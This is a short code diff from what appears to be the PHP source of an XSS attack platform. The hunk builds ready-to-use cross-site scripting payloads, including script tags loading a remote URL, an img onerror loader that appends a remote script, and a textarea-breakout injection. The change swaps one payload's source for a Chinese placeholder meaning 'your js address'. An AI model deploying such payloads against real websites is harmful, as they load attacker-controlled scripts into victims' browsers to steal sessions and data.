@@ -196,7 +196,7 @@ switch($act){
 		$shortUrl2=LongUrltoShortUrl2($longUrl);//短网址2
 		$shortShow1=StripStr("<script src=".$shortUrl."></script>");
 		$shortShow2=StripStr("<script src=".$shortUrl2."></script>");
-		$shortShow3=StripStr("<img src=x onerror=s=createElement('script');body.appendChild(s);s.src={$shortUrl};>");
+		$shortShow3=StripStr("<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='你的js地址';>");
 		$scriptShow1=StripStr("</textarea>'\"><script src=".$longUrl."></script>");
 		//$scriptShow1=StripStr("</textarea>'\"><script src=".URL_ROOT."/{$project[urlKey]}?".time()."></s
 		//	cript>");
